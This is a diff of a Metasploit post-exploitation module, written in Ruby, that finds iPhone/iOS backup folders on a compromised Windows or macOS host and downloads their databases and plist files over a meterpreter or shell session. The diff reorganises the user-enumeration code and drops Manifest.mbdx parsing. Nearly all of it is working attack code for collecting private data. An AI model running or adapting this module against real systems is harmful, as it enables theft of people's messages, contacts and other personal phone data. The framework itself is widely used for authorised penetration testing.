@@ -1,12 +1,14 @@
 ##
-# $Id$
+# $Id: 
 ##
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+#
+# 
 ##
 
 require 'msf/core'
@@ -25,11 +27,12 @@ class Metasploit3 < Msf::Post
 			'Author'         =>
 				[
 					'hdm',
+					'Satishb3',#Added support to iOS 5 & iOS 6backups - http://www.securitylearn.net
 					'bannedit' # Based on bannedit's pidgin_cred module structure
 				],
 			'Version'        => '$Revision$',
-			'Platform'       => ['windows', 'osx'],
-			'SessionTypes'   => ['meterpreter', 'shell']
+			'Platform'       => ['windows','osx'],
+			'SessionTypes'   => ['meterpreter','shell' ]
 		))
 		register_options(
 			[
@@ -80,109 +83,18 @@ class Metasploit3 < Msf::Post
 		process_backups(paths)
 	end
 
-	def enum_users_unix
-		if @platform == :osx
-			home = "/Users/"
-		else
-			home = "/home/"
-		end
-
-		if got_root?
-			userdirs = []
-			session.shell_command("ls #{home}").gsub(/\s/, "\n").split("\n").each do |user_name|
-				userdirs << home + user_name
-			end
-			userdirs << "/root"
-		else
-			userdirs = [ home + whoami ]
-		end
-
-		backup_paths = []
-		userdirs.each do |user_dir|
-			output = session.shell_command("ls #{user_dir}/Library/Application\\ Support/MobileSync/Backup/")
-			if output =~ /No such file/i
-				next
-			else
-				print_status("Found backup directory in: #{user_dir}")
-				backup_paths << "#{user_dir}/Library/Application\\ Support/MobileSync/Backup/"
-			end
-		end
-
-		check_for_backups_unix(backup_paths)
-	end
-
-	def check_for_backups_unix(backup_dirs)
-		dirs = []
-		backup_dirs.each do |backup_dir|
-			print_status("Checking for backups in #{backup_dir}")
-			session.shell_command("ls #{backup_dir}").each_line do |dir|
-				next if dir == "." || dir == ".."
-				if dir =~ /^[0-9a-f]{16}/i
-					print_status("Found #{backup_dir}\\#{dir}")
-					dirs << ::File.join(backup_dir.chomp, dir.chomp)
-				end
-			end
-		end
-		dirs
-	end
-
-	def enum_users_windows
-		paths = Array.new
-
-		if got_root?
-			begin
-				session.fs.dir.foreach(@users) do |path|
-					next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
-					bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
-					dirs = check_for_backups_win(bdir)
-					dirs.each { |dir| paths << dir } if dirs
-				end
-			rescue ::Rex::Post::Meterpreter::RequestError
-				# Handle the case of the @users base directory is not accessible
-			end
-		else
-			print_status "Only checking #{whoami} account since we do not have SYSTEM..."
-			path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
-			dirs = check_for_backups_win(path)
-			dirs.each { |dir| paths << dir } if dirs
-		end
-		return paths
-	end
-
-	def check_for_backups_win(bdir)
-		dirs = []
-		begin
-				print_status("Checking for backups in #{bdir}")
-				session.fs.dir.foreach(bdir) do |dir|
-				if dir =~ /^[0-9a-f]{16}/i
-					print_status("Found #{bdir}\\#{dir}")
-					dirs << "#{bdir}\\#{dir}"
-				end
-			end
-		rescue Rex::Post::Meterpreter::RequestError
-			# Handle base directories that do not exist
-		end
-		dirs
-	end
-
 	def process_backups(paths)
 		paths.each {|path| process_backup(path) }
 	end
 
 	def process_backup(path)
-
 		print_status("Pulling data from #{path}...")
 
 		mbdb_data = ""
-		mbdx_data = ""
-
+		
 		print_status("Reading Manifest.mbdb from #{path}...")
 		if session.type == "shell"
 			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
-			if mbdb_data =~ /No such file/i
-				print_status("Manifest.mbdb not found in #{path}...")
-				return
-			end
 		else
 			mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
 			until mfd.eof?
@@ -191,23 +103,7 @@ class Metasploit3 < Msf::Post
 			mfd.close
 		end
 
-		print_status("Reading Manifest.mbdx from #{path}...")
-		if session.type == "shell"
-			mbdx_data = session.shell_command("cat #{path}/Manifest.mbdx")
-			if mbdx_data =~ /No such file/i
-				print_status("Manifest.mbdx not found in #{path}...")
-				return
-			end
-		else
-			mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
-			until mfd.eof?
-				mbdx_data << mfd.read
-			end
-			mfd.close
-		end
-
-		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data, mbdx_data)
-
+		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data)
 		patterns = []
 		patterns << /\.db$/i if datastore['DATABASES']
 		patterns << /\.plist$/i if datastore['PLISTS']
@@ -216,14 +112,13 @@ class Metasploit3 < Msf::Post
 
 		done = {}
 		patterns.each do |pat|
-			manifest.entries.each_pair do |fname, info|
+			manifest.entry_offsets.each_pair do |fname,info|
 				next if done[fname]
 				next if not info[:filename].to_s =~ pat
 
 				print_status("Downloading #{info[:domain]} #{info[:filename]}...")
 
 				begin
-
 				fdata = ""
 				if session.type == "shell"
 					fdata = session.shell_command("cat #{path}/#{fname}")
@@ -252,6 +147,63 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+	def enum_users_unix
+		if @platform == :osx
+			home = "/Users/"
+		else
+			home = "/home/"
+		end
+
+		if got_root?
+			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
+			userdirs << "/root\n"
+		else
+			userdirs = session.shell_command("ls #{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/")
+			if userdirs =~ /No such file/i
+				return
+			else
+				print_status("Found backup directory for: #{whoami}")
+				return ["#{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/"]
+			end
+		end
+
+		paths = Array.new
+		userdirs.each_line do |dir|
+			dir.chomp!
+			next if dir == "." || dir == ".."
+
+			dir = "#{home}#{dir}" if dir !~ /root/
+			print_status("Checking for backup directory in: #{dir}")
+
+			stat = session.shell_command("ls #{dir}/Library/Application\\ Support/MobileSync/Backup/")
+			next if stat =~ /No such file/i
+			paths << "#{dir}/Library/Application\\ Support/MobileSync/Backup/"
+		end
+		return paths
+	end
+
+	def enum_users_windows
+		paths = Array.new
+
+		if got_root?
+			begin
+				session.fs.dir.foreach(@users) do |path|
+					next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
+					bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
+					dirs = check_for_backups_win(bdir)
+					dirs.each { |dir| paths << dir } if dirs
+				end
+			rescue ::Rex::Post::Meterpreter::RequestError
+				# Handle the case of the @users base directory is not accessible
+			end
+		else
+			print_status "Only checking #{whoami} account since we do not have SYSTEM..."
+			path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
+			dirs = check_for_backups_win(path)
+			dirs.each { |dir| paths << dir } if dirs
+		end
+		return paths
+	end
 
 	def got_root?
 		case @platform
@@ -271,6 +223,23 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+
+	def check_for_backups_win(bdir)
+		dirs = []
+		begin
+				print_status("Checking for backups in #{bdir}")
+				session.fs.dir.foreach(bdir) do |dir|
+				if dir =~ /^[0-9a-f]{16}/i
+					print_status("Found #{bdir}\\#{dir}")
+					dirs << "#{bdir}\\#{dir}"
+				end
+			end
+		rescue Rex::Post::Meterpreter::RequestError
+			# Handle base directories that do not exist
+		end
+		dirs
+	end
+
 	def whoami
 		if @platform == :windows
 			session.fs.file.expand_path("%USERNAME%")
@@ -278,4 +247,5 @@ class Metasploit3 < Msf::Post
 			session.shell_command("whoami").chomp
 		end
 	end
+
 end
